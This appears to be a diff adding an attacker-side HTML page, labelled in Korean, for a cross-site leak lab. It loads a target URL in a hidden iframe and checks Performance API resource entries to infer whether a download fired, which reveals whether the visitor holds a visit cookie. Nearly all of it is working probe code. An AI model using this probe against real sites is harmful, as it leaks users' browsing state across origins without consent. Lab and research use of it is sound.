@@ -1,0 +1,128 @@
+<!doctype html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Attacker Download Probe</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      margin: 28px;
+      line-height: 1.5;
+      color: #111827;
+      background: #f8fafc;
+    }
+
+    main {
+      max-width: 960px;
+      margin: 0 auto;
+      background: #ffffff;
+      border: 1px solid #e5e7eb;
+      border-radius: 12px;
+      padding: 24px;
+      box-shadow: 0 8px 30px rgba(15, 23, 42, 0.06);
+    }
+
+    code {
+      background: #f1f5f9;
+      padding: 2px 6px;
+      border-radius: 6px;
+      font-size: 0.95em;
+    }
+
+    .panel {
+      border: 1px solid #e2e8f0;
+      border-radius: 10px;
+      padding: 12px;
+      background: #f8fafc;
+      margin: 12px 0;
+    }
+
+    button {
+      border: 1px solid #cbd5e1;
+      border-radius: 8px;
+      background: #ffffff;
+      padding: 8px 12px;
+      cursor: pointer;
+      margin-right: 8px;
+    }
+
+    button:hover {
+      background: #f1f5f9;
+    }
+  </style>
+</head>
+<body>
+  <main>
+    <h1>Attacker 페이지: Performance API 기반 다운로드 탐지</h1>
+
+    <p>타깃 URL: <code>__TARGET_BASE_TEXT__</code></p>
+    <p><a href="__ATTACKER_STEALTH_URL__">Stealthier 이중 iframe 버전 열기</a></p>
+
+    <div class="panel">
+      <p>1) 방문 쿠키가 없는 유저: Banned `/` 첫 방문 시 HTML 없이 파일이 즉시 다운로드됩니다.</p>
+      <p>2) 방문 쿠키가 있는 유저: Banned `/` 재방문 시 "이미 메뉴얼을 알고 계시죠?" 메시지 HTML이 보입니다.</p>
+      <p>3) 이 페이지에서 "탐지 실행"을 눌러 <code>performance entry</code> 존재 여부를 관찰합니다.</p>
+    </div>
+
+    <p>
+      <button id="probe">탐지 실행</button>
+      <button id="clear">로그 지우기</button>
+    </p>
+
+    <pre id="log" class="panel" style="white-space: pre-wrap; min-height: 180px;"></pre>
+  </main>
+
+  <script>
+    const targetBase = __TARGET_BASE_JSON__;
+    const output = document.getElementById('log');
+
+    function log(line) {
+      output.textContent += '[' + new Date().toLocaleTimeString() + '] ' + line + '\n';
+      output.scrollTop = output.scrollHeight;
+    }
+
+    function wait(ms) {
+      return new Promise((resolve) => setTimeout(resolve, ms));
+    }
+
+    async function runProbe() {
+      performance.setResourceTimingBufferSize(200);
+      performance.clearResourceTimings();
+
+      const nonce = String(Date.now()) + '-' + Math.random().toString(16).slice(2);
+      const target = targetBase + '?nonce=' + encodeURIComponent(nonce);
+
+      log('probe target: ' + target);
+      const frame = document.createElement('iframe');
+      frame.style.display = 'none';
+      frame.src = target;
+      document.body.appendChild(frame);
+
+      await wait(1800);
+
+      const entries = performance.getEntriesByName(target);
+      const found = entries.length > 0;
+
+      if (found) {
+        log('result: performance entry 존재 -> 다운로드 미발생(방문 쿠키 있을 가능성)');
+      } else {
+        log('result: performance entry 없음 -> 다운로드 발생(방문 쿠키 없을 가능성)');
+      }
+
+      frame.remove();
+    }
+
+    document.getElementById('probe').addEventListener('click', () => {
+      runProbe().catch((error) => {
+        log('error: ' + error.message);
+      });
+    });
+
+    document.getElementById('clear').addEventListener('click', () => {
+      output.textContent = '';
+      performance.clearResourceTimings();
+    });
+  </script>
+</body>
+</html>
